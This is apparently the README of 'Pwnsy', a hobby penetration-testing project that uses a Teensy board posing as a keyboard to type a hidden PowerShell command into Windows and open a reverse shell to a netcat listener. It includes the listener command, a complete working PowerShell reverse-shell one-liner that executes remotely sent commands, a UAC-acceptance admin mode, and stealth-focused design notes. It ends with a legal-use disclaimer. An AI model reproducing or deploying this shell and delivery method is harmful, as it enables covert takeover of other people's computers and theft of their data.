# Pwnsy
Penetration Testing Tool for Windows 7 => 10

Idea : Peensy (Offensive Security)  
Thanks to : @samratashok for the tiny (~280 characters) PowerShell TCP Client

## What does it do
It allows to execute a reverse shell on any Windows machine with PowerShell enabled within a minimal  
amount of time, and in a stealthy manner. 

## How does it works
It uses the abilities of the Teensy boards to deploy a small powershell script, using keyboard emulation.  
The goal of this project was to find a way to launch a TCP Client that would connect to a netcat listener.  

To make it as stealthy as possible, we use the "Run" window, that can be accessed by pressing Windows +R.  
Tho, the amount of text is limited to 260 characters. So we need to run a PowerShell prompt in "Hidden"  
windowstyle, and pass the commands to execute a TCP client. Unfortunately there isn't enough place to  
make the client respond to the commands sent by the netcat listener within 260 chars. 

The solution is to wait for the netcat listener to send the complete version of the TCP Client and execute it.  
That way we can have feedback from a distant machine of what's happening on commands execution sent from the server.  

In case you need an elevated PowerShell prompt to execute script from the server, there is an admin mode  
that will run PowerShell as admin and wait for a button to be pressed to accept the UAC prompt if there is one.  
That way, it's reliable and we don't have to pray for it to pop within a fixed amount of time (no hardcoded delays involved).  

1. Hardware required
   - A Teensy board (2.0 up to 3.6)
   - Switch buttons (3) to configure the different modes without compiling it every time
   - A test PCB to put those
   
What are the buttons doing? 

Button 1. Start typing after the keyboard is ready  
Button 2. Accept the UAC prompt if there is the need to  
Button 3. Admin mode (that will modify the command typed in the Run window in order to execute an elevated  
PowerShell prompt, then wait for the button 2 to be pressed in order to continue)  

## What do I need to setup (Server side)
Simply run netcat on linux, like this :  
`netcat -l -p 1337`

I advice you to run it inside of a loop in bash, so you can exit it with Ctrl+C, because that's needed if you  
send another version of the TCP Client to the client (if you use -k netcat will close when you hit Ctrl+C)  

Once you recieve a connexion, push the complete TCP Client to the client so you can have feedback
on what you execute :  
```  
$b=[text.encoding]::UTF8;while(1){try{;$u=(New-Object Net.Sockets.TCPClient("0.0.0.0",1337)).GetStream();$w=New-Object byte[] 65535;while(($i=$u.Read($w,0,$w.Length)) -ne 0){$d=$b.GetString($w,0,$i);$v=$b.GetBytes((iex $d 2>&1|Out-String));$u.Write($v,0,$v.Length)}}catch{}}
```  
(don't forget to replace the IP and port to fit your situation) 

Restart your netcat listener so the new client version can connect to your port  
Done! You can execute any PowerShell command and get the output in your netcat listener!

## Demo : 
[![5 Seconds Reverse Shell](https://img.youtube.com/vi/8NpX56rHsYY/0.jpg)](https://www.youtube.com/watch?v=8NpX56rHsYY)

## Example of Post-Exploitation payload : 
[![Screenshot Retrieval from Reverse Shell](https://img.youtube.com/vi/HPO-l4Br-zY/0.jpg)](https://www.youtube.com/watch?v=HPO-l4Br-zY)

### Notes
Intended for legal usage ONLY, I'm not liable for anything you do with this code.  
Feel free to give feedback and ideas in order to improve it!
